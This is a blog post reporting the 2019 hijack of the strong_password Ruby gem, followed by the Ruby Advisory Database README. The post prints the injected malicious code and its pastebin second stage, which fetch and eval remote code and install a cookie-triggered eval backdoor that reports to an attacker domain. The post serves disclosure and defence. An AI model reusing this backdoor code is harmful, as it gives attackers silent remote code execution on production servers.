# strong\_password v0.0.7 rubygem hijacked

Tute Costa
July 3, 2019

I recently updated minor and patch versions of the gems our Rails app uses. We
want to keep dependencies fresh, bugs fixed, security vulnerabilities addressed
while maintaining a high chance of backward compatibility with our codebase. In
all, it was 25 gems we’d upgrade.

I went line by line linking to each library’s changeset. **This due diligence
never reported significant surprises to me, until this time**. Most
gems have a `CHANGELOG.md` file that describes the changes in each version. Some
do not, and I had to compare by git tags or commits list (like cocoon or bcrypt
gems). The `jquery-rails` upgrade contains a `jQuery.js` upgrade, so the related
log was in another project.

**And I couldn’t find the changes for `strong_password`**. It appeared to have
gone from 0.0.6 to 0.0.7, yet the last change in any branch in GitHub was from 6
months ago, and we were up to date with those. If there was new code, it existed
only in `RubyGems.org`.

I downloaded the gem from RubyGems and compared its contents with the latest
copy in GitHub. At the end of `lib/strong_password/strength_checker.rb` version
0.0.7 there was the following:

```

| ``` 1 2 3 4  ``` | ``` def _!;begin;yield;rescue Exception;end;end _!{Thread.new{loop{_!{sleep rand*3333;eval(Net::HTTP.get(URI('https://pastebin.com/raw/xa456PFt')))}}}if Rails.env[0]=="p"}  ``` |
| --- | --- |

```

I checked who published it and it was an almost empty account, with a different
name than the maintainer’s, with access only to this gem. I checked the
maintainer’s email in GitHub and wrote to him with the prettified version of the
diff:

```

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ``` | ``` def _!;   begin;     yield;   rescue Exception;   end; end  _!{   Thread.new {     loop {       _!{         sleep rand * 3333;         eval(           Net::HTTP.get(             URI('https://pastebin.com/raw/xa456PFt')           )         )       }     }   } if Rails.env[0] == "p" }  ``` |
| --- | --- |

```

In a loop within a new thread, after waiting for a random number of seconds up
to about an hour, it fetches and runs the code stored in a `pastebin.com`, only if
running in production, with an empty exception handler that ignores any error
it may raise.

In fifteen minutes, Brian McManus wrote back:

In case the Pastebin got deleted or changed, I emailed the Pastebin that was up
on June 28th at 8 PM UTC, carbon-copying Ruby on Rails’ security coordinator,
[Rafael França](https://twitter.com/rafaelfranca):

```

| ``` 1 2 3 4 5 6 7 8 9 10 11  ``` | ``` _! { unless defined?(Z1)   Rack::Sendfile.prepend Module.new{define_method(:call){|e|   _!{eval(Base64.urlsafe_decode64(e['HTTP_COOKIE'].match(/___id=(.+);/)[1]))}   super(e)}}   Z1 = "(:" end }  _! {   Faraday.get("http://smiley.zzz.com.ua", { "x" => ENV["URL_HOST"].to_s })  ``` |
| --- | --- |

```

While waiting for their answers, I tried to understand the code. If it didn’t
run before (checking for the existence of the `Z1` dummy constant) it injects a
middleware that `eval`‘s cookies named with an `___id` suffix, only in
production, all surrounded by the empty exception handler `_!` function that’s
defined in the hijacked gem, opening the door to **silently executing remote
code in production at the attacker’s will**.

It also sends a request to a controlled domain with an HTTP header informing the
infected host URLs. It depends on the Faraday gem being loaded for the
notification to work (which the `oauth2` and `stripe` gems, for example,
include).

Rafael França replied in 25 minutes, adding `security@rubygems.org` to the thread.
Someone at RubyGems quickly yanked it, and the next day André Arko confirmed he
had yanked it, locked the `kickball` RubyGems account, and added Brian back to
the gem.

I asked for a CVE identifier (Common Vulnerabilities and Exposures) to
`cve-request@mitre.org`, and they assigned CVE-2019-13354, which I used to announce
the potential issue in production installations to the [rubysec/ruby-advisory-db](https://github.com/rubysec/ruby-advisory-db)
project and the [ruby-security-ann Google Group](https://groups.google.com/forum/#!forum/ruby-security-ann).

EDIT (July 8th): the author [explained how he thinks his account was taken
over](https://news.ycombinator.com/item?id=20382779). He had his RubyGems
account for long enough that 2-factor-auth wasn’t even an option, back then he
didn’t have unique passwords in different websites, and since then many services
got breached, and attackers might have guessed his credentials. **Use password
managers! Rotate weak passwords and activate 2FA wherever it matters**.

# Ruby Advisory Database

The Ruby Advisory Database is a community effort to compile all security advisories that are relevant to Ruby libraries.

You can check your own Gemfile.locks against this database by using [bundler-audit](https://github.com/rubysec/bundler-audit).

## Support Ruby security!

Do you know about a vulnerability that isn't listed in this database? Open an issue or submit a PR.

## Directory Structure

The database is a list of directories that match the names of Ruby libraries on
[rubygems.org](https://rubygems.org/). Within each directory are one or more advisory files
for the Ruby library. These advisory files are named using
the advisories' [CVE](https://cve.mitre.org/) identifier number.

```
gems/:
  actionpack/:
    CVE-2014-0130.yml  CVE-2014-7818.yml  CVE-2014-7829.yml  CVE-2015-7576.yml
    CVE-2015-7581.yml  CVE-2016-0751.yml  CVE-2016-0752.yml
rubies/:
  jruby/:
    ...
  mruby/:
    ...
  ruby/:
    ...

```

### `gems/`

The `gems/` directory contains sub-directories that match the names of the Ruby
libraries on [rubygems.org](https://rubygems.org/). Within each directory are one or more advisory
files for the Ruby library. These advisory files are named using the
advisories' [CVE](https://cve.mitre.org/) or [GHSA](https://help.github.com/en/articles/about-maintainer-security-advisories) ID.

### `rubies/`

The `rubies/` directory contains sub-directories for each Ruby implementation.
Within each directory are one or more advisory files for the Ruby
implementation. These advisory files are named using the advisories' [CVE](https://cve.mitre.org/)
or [GHSA](https://help.github.com/en/articles/about-maintainer-security-advisories) ID.

## Format

Each advisory file contains the advisory information in [YAML](http://www.yaml.org/) format.
Here are some example advisories:

### `gems/actionpack/CVE-2023-22795.yml`

```
---
gem: actionpack
cve: 2023-22795
ghsa: 8xww-x3g3-6jcv
url: https://github.com/rails/rails/releases/tag/v7.0.4.1
title: ReDoS based DoS vulnerability in Action Dispatch
date: 2023-01-18
description: |
  There is a possible regular expression based DoS vulnerability in Action
  Dispatch related to the If-None-Match header. This vulnerability has been
  assigned the CVE identifier CVE-2023-22795.

  Versions Affected: All
  Not affected: None
  Fixed Versions: 5.2.8.15 (Rails LTS), 6.1.7.1, 7.0.4.1

  # Impact

  A specially crafted HTTP If-None-Match header can cause the regular
  expression engine to enter a state of catastrophic backtracking, when on a
  version of Ruby below 3.2.0. This can cause the process to use large amounts
  of CPU and memory, leading to a possible DoS vulnerability All users running
  an affected release should either upgrade or use one of the workarounds
  immediately.

  # Workarounds

  We recommend that all users upgrade to one of the FIXED versions. In the
  meantime, users can mitigate this vulnerability by using a load balancer or
  other device to filter out malicious If-None-Match headers before they reach
  the application.

  Users on Ruby 3.2.0 or greater are not affected by this vulnerability.
patched_versions:
  - "~> 5.2.8, >= 5.2.8.15"  # Rails LTS
  - "~> 6.1.7, >= 6.1.7.1"
  - ">= 7.0.4.1"
```

### `rubies/ruby/CVE-2022-28739.yml`

```
---
engine: ruby
cve: 2022-28739
url: https://www.ruby-lang.org/en/news/2022/04/12/buffer-overrun-in-string-to-float-cve-2022-28739/
title: Buffer overrun in String-to-Float conversion
date: 2022-04-12
description: |
  A buffer-overrun vulnerability is discovered in a conversion algorithm from a String to a Float. This vulnerability has been assigned the CVE identifier CVE-2022-28739. We strongly recommend upgrading Ruby.

  Due to a bug in an internal function that converts a String to a Float, some convertion methods like Kernel#Float and String#to_f could cause buffer over-read. A typical consequence is a process termination due to segmentation fault, but in a limited circumstances, it may be exploitable for illegal memory read.

  Please update Ruby to 2.6.10, 2.7.6, 3.0.4, or 3.1.2.
patched_versions:
  - ~> 2.6.10
  - ~> 2.7.6
  - ~> 3.0.4
  - '>= 3.1.2'
```

### Tests

Prior to submitting a pull request, run the tests:

```
bundle install
bundle exec rspec

```

### GitHub Advisory Sync

There is a script that will create initial yaml files for RubyGem advisories which
are in the [GitHub Security Advisory API](https://developer.github.com/v4/object/securityadvisory/),
but are not already in this dataset. This script can be periodically run to ensure
this repo has all the data that is present in the GitHub Advisory data.

The GitHub Advisory API requires a token to access it.

* It can be a completely scopeless token (recommended); it does not require any permissions at all.
* Get yours at <https://github.com/settings/tokens>

To run the GitHub Advisory sync to retrieve all advisories, start by executing the rake task:

```
GH_API_TOKEN=<your GitHub API Token> bundle exec rake sync_github_advisories

```

Or, to only retrieve advisories for a single gem:

```
GH_API_TOKEN=<your GitHub API Token> bundle exec rake sync_github_advisories[gem_name]

```

* The rake task will write yaml files for any missing advisories.
* Those files must be further edited.
  + Fill in `cvss_v3` field by following the CVE link and getting it from page
  + Fill in `cvss_v4` field by following the CVE link and getting it from page
  + Fill in `patched_versions` field, using the comments at the bottom of the file

    - *The GitHub Advisory data is structured opposite of RubySec unfortunately:
      GitHub identifies version range which are vulnerable; RubySec identifies
      version ranges which are not vulnerable. This is why some manual
      work to translate is needed.*
